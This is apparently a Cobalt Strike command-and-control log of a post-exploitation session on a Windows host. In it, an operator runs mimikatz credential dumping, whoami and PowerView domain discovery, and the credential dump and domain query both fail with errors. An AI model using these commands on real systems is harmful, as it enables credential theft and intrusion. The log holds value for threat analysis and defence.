@@ -1,0 +1,34 @@
+08/15 21:37:50 UTC [metadata] 185.46.46.42 <- 185.46.46.42; computer: DESKTOP-FDPJATB; user: admin; process: powershell.exe; pid: 8092; os: Windows; version: 10.0; build: 19045; beacon arch: x64 (x64)
+08/15 21:39:15 UTC [task] <T1003, T1055, T1093> Tasked beacon to run mimikatz's sekurlsa::wdigest command
+08/15 21:39:47 UTC [checkin] host called home, sent: 788083 bytes
+08/15 21:39:50 UTC [output]
+received output:
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
+
+
+08/15 21:48:41 UTC [input] <Edogawa> shell whoami
+08/15 21:48:41 UTC [task] <T1059> Tasked beacon to run: whoami
+08/15 21:48:53 UTC [checkin] host called home, sent: 37 bytes
+08/15 21:48:53 UTC [output]
+received output:
+desktop-fdpjatb\admin
+
+
+08/15 22:54:38 UTC [output]
+9=========== 查看域信息 ==========
+
+08/15 22:54:38 UTC [task] <T1086, T1064> Tasked beacon to import: /home/jaguar/Desktop/CobaltStrike4.7/OLa/scripts/discovery-tools/Powerview.ps1
+08/15 22:54:38 UTC [task] <T1086, T1093> Tasked beacon to run: Get-NetForest (unmanaged)
+08/15 22:55:15 UTC [checkin] host called home, sent: 278049 bytes
+08/15 22:55:21 UTC [output]
+received output:
+ERROR: Исключение при вызове "GetCurrentForest" с "0" аргументами: "Текущий контекст безопасности не связа
+ERROR: н с доменом или лесом Active Directory."
+ERROR: строка:4344 знак:13
+ERROR: +             $ForestObject = [System.DirectoryServices.ActiveDirectory ...
+ERROR: +             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ERROR:     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+ERROR:     + FullyQualifiedErrorId : ActiveDirectoryOperationException
+ERROR:  
+
+
